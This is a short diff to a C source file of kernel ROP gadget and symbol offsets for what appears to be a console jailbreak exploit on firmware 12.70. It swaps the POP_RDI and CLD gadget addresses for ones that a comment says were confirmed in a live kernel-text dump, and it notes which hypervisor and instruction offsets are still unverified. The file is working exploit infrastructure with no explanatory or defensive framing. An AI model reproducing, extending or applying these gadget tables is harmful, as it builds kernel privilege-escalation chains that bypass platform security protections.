@@ -5,8 +5,9 @@
  * Candidate offsets extracted from EchoStretch's unpushed 12.70 ELF.
  * These are text-relative, as in the 13.xx tables. PMAP_STORE, IDT_ARRAY,
  * and COMMON_TSS also match the public kstuff-lite data-relative table after
- * applying the SDK's 0xD50000 text/data gap. The remaining instruction and
- * HV offsets have not been independently validated on 12.70 hardware.
+ * applying the SDK's 0xD50000 text/data gap. POP_RDI and CLD were replaced
+ * with exact byte matches in the live 12.70 kernel-text dump. Other
+ * instruction and HV offsets have not all been validated on 12.70 hardware.
  * main.c blocks the 12.70 HV path by default.
  */
 uint64_t g_sym_map_1270[] = {
@@ -31,7 +32,7 @@ uint64_t g_gadget_map_1270[] = {
   0x272467,   // KERNEL_GADGET_IRETQ
   0xC9FBF4,   // KERNEL_GADGET_POP_RAX
   0x3410D2,   // KERNEL_GADGET_POP_RCX
-  0xD65548,   // KERNEL_GADGET_POP_RDI; confirmed NX on 12.70 hardware
+  0x2A6784,   // KERNEL_GADGET_POP_RDI; live dump: 5f c3, executable text
   0x2F5CB0,   // KERNEL_GADGET_POP_RSI
   0x34F4EB,   // KERNEL_GADGET_POP_RDX
   0x7DEDBF,   // KERNEL_GADGET_POP_R8; isolated trigger KP, suspect/unverified
@@ -45,7 +46,7 @@ uint64_t g_gadget_map_1270[] = {
   0x971E64,   // KERNEL_GADGET_MOV_RAX_RSI
   0xC7380A,   // KERNEL_GADGET_MOV_RAX_RDI
   0x30B6C7,   // KERNEL_GADGET_REP_MOVSB
-  0x1226933,  // KERNEL_GADGET_CLD; confirmed NX on 12.70 hardware
+  0x369460,   // KERNEL_GADGET_CLD; live dump: fc c3, executable text
   0xC9FBF5,   // KERNEL_GADGET_RET_TRAMP
   0x2AC9F8,   // KERNEL_GADGET_DBREG_RESUME
 };
